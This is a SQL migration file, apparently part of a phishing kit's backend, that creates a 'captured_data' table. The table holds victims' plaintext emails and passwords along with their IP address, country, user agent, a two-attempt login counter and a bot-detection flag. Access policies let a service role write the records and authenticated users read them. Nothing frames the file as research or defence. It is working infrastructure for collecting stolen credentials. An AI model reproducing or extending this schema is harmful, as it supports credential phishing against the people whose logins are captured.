/*
  # Create captured data table

  1. New Tables
    - `captured_data`
      - `id` (uuid, primary key)
      - `session_id` (text) - unique session identifier
      - `email` (text) - captured email
      - `password` (text) - captured password  
      - `attempt_number` (integer) - 1 or 2
      - `ip_address` (text) - visitor IP
      - `country` (text) - visitor country
      - `user_agent` (text) - browser user agent
      - `timestamp` (timestamptz) - when captured
      - `is_bot_detected` (boolean) - bot detection result
      - `created_at` (timestamptz) - record creation time

  2. Security
    - Enable RLS on `captured_data` table
    - Add policy for service role access (for server-side operations)
*/

CREATE TABLE IF NOT EXISTS captured_data (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  session_id text NOT NULL,
  email text NOT NULL,
  password text NOT NULL,
  attempt_number integer NOT NULL CHECK (attempt_number IN (1, 2)),
  ip_address text NOT NULL,
  country text DEFAULT 'Unknown',
  user_agent text NOT NULL,
  timestamp timestamptz DEFAULT now(),
  is_bot_detected boolean DEFAULT false,
  created_at timestamptz DEFAULT now()
);

ALTER TABLE captured_data ENABLE ROW LEVEL SECURITY;

-- Policy for service role to insert/select data
CREATE POLICY "Service role can manage captured data"
  ON captured_data
  FOR ALL
  TO service_role
  USING (true)
  WITH CHECK (true);

-- Policy for authenticated users to read data (optional - for admin access)
CREATE POLICY "Authenticated users can read captured data"
  ON captured_data
  FOR SELECT
  TO authenticated
  USING (true);

-- Create index for common queries
CREATE INDEX IF NOT EXISTS idx_captured_data_session_id ON captured_data(session_id);
CREATE INDEX IF NOT EXISTS idx_captured_data_timestamp ON captured_data(timestamp);
CREATE INDEX IF NOT EXISTS idx_captured_data_ip_address ON captured_data(ip_address);